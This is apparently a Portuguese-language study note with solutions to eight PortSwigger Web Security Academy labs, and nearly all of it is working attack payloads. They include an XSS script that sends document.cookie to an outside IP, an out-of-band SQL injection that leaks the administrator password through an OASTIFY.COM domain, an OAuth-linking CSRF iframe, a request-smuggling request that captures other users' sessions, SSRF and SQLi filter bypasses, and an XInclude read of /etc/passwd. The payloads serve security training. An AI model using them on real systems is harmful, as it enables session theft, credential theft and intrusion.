# Passo 2 - Labs

Nesse passo, são apenas 8 laboratórios que a PortSwigger indica. 

<br>

## Laboratórios

**Lab: Exploiting Cross-Site Scripting to Steal Cookies**
```
<script>
  window.location = 'http://10.2.75.138:4242/page?param=' + document.cookie
</script>
```

<br>
<br>

**Lab: Blind SQL injection with out-of-band data exfiltration**
```
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--
```

<br>
<br>

**Lab: Forced OAuth Profile Linking**

Analise o preceso de anexar mídia social e observe que a request com o código `oauth` não possui o parâmetro `state`.
```
/oauth-linking?code=f4vwrTOuewZl1c57xpceroEU5sItRCyy9mFjxCLhmk1
```

Começe um processo para linkar a social media, pegue o código `oauth` e drope a request para não utilizá-lo.

Crie um iframe para explorar isso com CSRF:
```
<iframe src="https://0abc003804e351ab8225664700de000f.web-security-academy.net/oauth-linking?code=f4vwrTOuewZl1c57xpceroEU5sItRCyy9mFjxCLhmk1"></iframe>
```

<br>
<br>

**Lab: Brute-Forcing a stay-logged-in Cookie**

O cookie tem esse formato:
```
base64(username+':'+md5HashOfPassword)
```

<br>
<br>

**Lab: Exploiting HTTP Request Smuggling to Capture Other Users' Requests**
```
POST / HTTP/1.1
Host: 0ace00a9039622498275d480003400f8.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 272
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=2MbInCpTxZI8yczIsHWPwJRw15stsKQU
Content-Length: 850
Content-Type: application/x-www-form-urlencoded

csrf=kYMR3K82FbSjkK1f7eazvn7xDX8yikO1&postId=3&name=foobar&email=foo%40bar.com&website=https%3A%2F%2Fbar&comment=foo
```

<br>
<br>

**Lab: SSRF with Blacklist-Based Input Filter**
```
stockApi=http://127.1/Admin

Ou

stockApi=http://127.1/%25%36%31dmin
```

<br>
<br>

**Lab: SQL Injection with Filter Bypass via XML Encoding**
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

<br>
<br>

**Lab: Discovering Vulnerabilities Quickly with Targeted Scanning**
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
